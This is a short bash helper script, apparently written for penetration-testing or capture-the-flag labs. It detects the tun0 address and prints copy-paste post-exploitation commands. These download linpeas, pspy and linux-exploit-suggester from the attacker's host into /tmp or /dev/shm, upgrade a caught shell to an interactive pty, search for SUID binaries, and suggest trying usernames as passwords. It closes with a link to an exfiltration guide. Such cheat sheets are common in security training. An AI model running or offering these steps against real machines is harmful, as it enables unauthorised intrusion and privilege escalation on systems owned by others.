#!/bin/bash

# create an alias `ftl` to invoke this script 

# TUN0IP=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
TUN0IP=$((ifconfig tun0 | awk '/inet /{print $2}') 2>/dev/null)

echo ""

if [[ ! -z "$TUN0IP" ]];
then 
    echo "tun0: $TUN0IP "
else 
    TUN0IP="IP"
    echo "tun0: disconnected"
fi


# echo "tun0: $TUN0IP"
echo ""
echo "==================================="
echo "        Linux File Transfer"
echo "==================================="
echo ""
echo "wget $TUN0IP/linpeas.sh -P /tmp"
echo "wget $TUN0IP/linpeas.sh -P /dev/shm"
echo "curl $TUN0IP/linpeas.sh -o /tmp/lp.sh"
echo "curl $TUN0IP/linpeas.sh -o /dev/shm/lp.sh"
echo "wget $TUN0IP/pspy64 -P /tmp"
echo "wget $TUN0IP/les.sh -P /tmp"
echo "fetch $TUN0IP/linpeas.sh #FreeBSD"
echo ""
echo "==================================="
echo "           Upgrade Shell"
echo "==================================="
echo ""
echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "Ctrl + Z"
echo "stty raw -echo; fg; reset"
echo "export TERM=xterm-256color"
echo "stty columns 146 rows 36"
echo "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/tmp"
echo ""
echo "==================================="
echo "       Privilege Escalation"      
echo "==================================="
echo ""
echo "find / -perm /4000 2>/dev/null"
echo "find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null"
echo "Try usernames as passwords"



echo ""
echo "More at: https://book.hacktricks.xyz/exfiltration"

